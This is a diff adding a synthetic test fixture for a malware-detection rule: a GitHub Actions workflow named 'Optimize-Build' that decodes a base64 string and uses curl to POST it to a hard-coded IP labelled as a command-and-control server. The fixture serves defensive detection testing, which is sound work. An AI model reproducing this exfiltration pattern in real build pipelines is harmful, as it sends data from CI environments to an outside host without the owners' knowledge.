@@ -1,0 +1,15 @@
+# Synthetic positive fixture — Megalodon_High_Confidence (multiple IoCs)
+# Contains C2 IP + Optimize-Build name + base64 payload — the full targeted variant signature.
+# The base64 string encodes a benign placeholder ("echo hello"), not a real payload.
+# This is a text file only — not a functional workflow; cannot execute anything.
+name: Optimize-Build
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: run
+        run: |
+          PAYLOAD=$(echo aGVsbG8K | base64 -d)
+          curl -s http://216.126.225.129:8443/out -d "$PAYLOAD"
